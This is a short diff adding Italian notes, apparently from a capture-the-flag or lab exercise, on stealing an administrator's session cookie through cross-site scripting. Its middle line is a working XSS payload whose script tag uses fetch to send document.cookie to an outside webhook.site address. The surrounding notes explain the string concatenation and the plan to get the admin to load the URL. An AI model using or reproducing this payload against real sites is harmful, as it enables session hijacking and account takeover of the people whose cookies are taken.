@@ -1,0 +1,3 @@
+per rubare il cookie: (concateno con il + nella query string sennò non prende document.cookie ma prende una stringa)
+<script>fetch('https://webhook.site/1e26f300-a6a6-4354-b21d-f7bae298c1ca?cookie=' + document.cookie)</script>
+per fare in mdoo che l'admin mi invii il suo reporto l'url aa cui mi porta quello script facendo in modo che mi invii il suo di cookie
